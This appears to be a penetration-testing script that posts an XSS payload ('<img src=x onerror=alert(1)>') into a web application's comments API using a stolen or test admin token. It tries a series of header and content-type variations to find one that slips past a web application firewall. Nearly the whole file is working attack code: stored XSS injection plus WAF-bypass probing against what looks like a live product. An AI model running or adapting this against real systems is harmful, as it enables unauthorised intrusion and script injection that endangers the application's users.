import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
tag='ZXW'+uuid.uuid4().hex[:5]
PAY=f'<img src=x onerror=alert(1)>{tag}'
def post(extra_headers=None, ct='application/json', body=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/comments','-H','token: '+TOK,'-H',BB,'-H','Content-Type: '+ct]
    if extra_headers:
        for k,v in extra_headers.items(): cmd+=['-H',f'{k}: {v}']
    cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
base={"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                "commentable_id":33,"message_raw":PAY,"message_html":PAY}}
print("=== which header/content-type combination gets past the WAF? ===")
variants=[
 ('json-plain',      None, 'application/json'),
 ('jsonapi',         None, 'application/vnd.api+json'),
 ('x-auditboard',    {'X-Auditboard-Product':'System'}, 'application/json'),
 ('x-source',        {'X-Auditboard-Source':'SchemaTable Rows'}, 'application/json'),
 ('x-requested',     {'X-Requested-With':'XMLHttpRequest'}, 'application/json'),
 ('origin',          {'Origin':H,'Referer':H+'/workspace/12/exceptions/33'}, 'application/json'),
 ('accept-jsonapi',  {'Accept':'application/vnd.api+json'}, 'application/vnd.api+json'),
 ('all-ui-like',     {'Accept':'application/vnd.api+json','Origin':H,
                      'Referer':H+'/workspace/12/exceptions/33',
                      'X-Requested-With':'XMLHttpRequest'}, 'application/vnd.api+json'),
]
for label,hdr,ct in variants:
    c,b=post(hdr,ct,base)
    print(f"  {label:16} ct={ct[:28]:30} -> {c}")
